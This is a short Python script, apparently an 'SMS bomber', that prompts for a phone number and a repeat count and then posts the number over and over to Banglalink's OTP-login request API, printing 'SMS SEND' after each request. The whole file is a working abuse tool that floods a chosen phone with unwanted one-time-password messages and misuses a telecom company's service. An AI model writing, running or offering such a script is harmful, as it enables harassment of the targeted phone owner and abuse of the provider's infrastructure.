import requests




number=str(input('Enter Your Number:'))

amount=int(input('Enter Your Amount: '))

name="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
data={"mobile":number}



for i in range(amount):
	requests.post(name,data=data)
	print(str(i+1)+'SMS SEND')

